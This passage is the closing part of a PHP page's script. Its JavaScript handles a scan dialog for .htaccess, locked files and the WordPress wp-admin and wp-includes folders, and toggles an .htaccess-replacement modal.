}
function submitScan() {
    closeScanConfirmModal();
    closeScanModal();

    var master = document.getElementById('scanAll');
    var checked = !!(master && master.checked);
    ['scanHtaccess','scanLocked','scanWpAdmin','scanWpIncludes'].forEach(function(id){
        var el = document.getElementById(id);
        if (el) el.checked = checked;
    });

    document.getElementById('scanForm').submit();
}
function showHtaccessReplaceModal(){
  document.getElementById('htaccessReplaceModal').style.display='flex';
}
function closeHtaccessReplaceModal(){
  document.getElementById('htaccessReplaceModal').style.display='none';
}
function toggleCustomBox(){
  var on = document.getElementById('replaceCustom').checked;
  document.getElementById('customBox').style.display = on ? 'block' : 'none';
}
</script>

</body>
</html>
<?php ob_end_flush(); ?>